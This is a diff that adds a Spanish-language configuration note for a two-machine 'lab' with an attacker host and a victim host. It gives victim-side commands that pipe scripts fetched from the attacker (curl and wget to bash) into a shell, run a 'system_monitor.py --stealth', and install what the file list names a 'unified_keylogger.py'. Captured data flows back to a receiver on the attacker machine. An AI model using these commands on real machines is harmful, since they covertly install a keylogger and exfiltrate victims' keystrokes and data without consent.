@@ -1,0 +1,75 @@
+# CONFIGURACIÓN DE RED ACTUALIZADA
+# ================================
+
+## IPs del laboratorio:
+- Máquina atacante (receptor): 10.0.2.15
+- Máquina víctima (objetivo): 10.0.2.4
+
+## COMANDOS PARA MÁQUINA ATACANTE (10.0.2.15)
+# ==============================================
+
+# 1. Iniciar servidor receptor
+python3 data_receiver.py --port 8080
+
+# 2. Servir archivos para descargar
+python3 -m http.server 8080
+
+## COMANDOS PARA MÁQUINA VÍCTIMA (10.0.2.4)
+# ==========================================
+
+# Opción 1: Instalación automática (RECOMENDADA)
+curl -s http://10.0.2.15:8080/auto_setup.sh | bash
+
+# Opción 2: Instalación manual silenciosa
+wget -q -O - http://10.0.2.15:8080/auto_setup.sh | bash
+
+# Opción 3: Descarga y ejecución manual
+wget http://10.0.2.15:8080/system_monitor.py
+python3 system_monitor.py --stealth
+
+# Opción 4: Descargar proyecto completo
+wget -r -np -nH --cut-dirs=1 -R "index.html*" http://10.0.2.15:8080/
+
+## COMANDOS DE CONTROL
+# ====================
+
+# Detener monitoreo desde máquina víctima
+curl -s http://10.0.2.15:8080/stop_monitor.sh | bash
+
+# O ejecutar stop_monitor.sh localmente si lo tienes descargado
+./stop_monitor.sh --cleanup
+
+## VERIFICACIÓN DE CONECTIVIDAD
+# =============================
+
+# Desde víctima (10.0.2.4), verificar conexión al atacante:
+ping 10.0.2.15
+curl -I http://10.0.2.15:8080
+
+# Desde atacante (10.0.2.15), verificar conexión a víctima:
+ping 10.0.2.4
+
+## FLUJO COMPLETO DEL LABORATORIO
+# ===============================
+
+1. En atacante (10.0.2.15):
+   - Terminal 1: python3 data_receiver.py --port 8080
+   - Terminal 2: python3 -m http.server 8080
+
+2. En víctima (10.0.2.4):
+   - curl -s http://10.0.2.15:8080/auto_setup.sh | bash
+
+3. Monitorear resultados en atacante:
+   - Los datos aparecerán en received_data/
+
+4. Para detener (desde víctima):
+   - curl -s http://10.0.2.15:8080/stop_monitor.sh | bash
+
+## ARCHIVOS ACTUALIZADOS CON NUEVAS IPs:
+# =======================================
+✅ system_monitor.py - IP atacante: 10.0.2.15
+✅ auto_setup.sh - IP atacante: 10.0.2.15  
+✅ unified_keylogger.py - IP atacante: 10.0.2.15
+✅ README_new.md - Todas las referencias actualizadas
+✅ stop_monitor.sh - Sin cambios (no contenía IPs hardcodeadas)
+✅ data_receiver.py - Sin cambios (escucha en todas las interfaces)
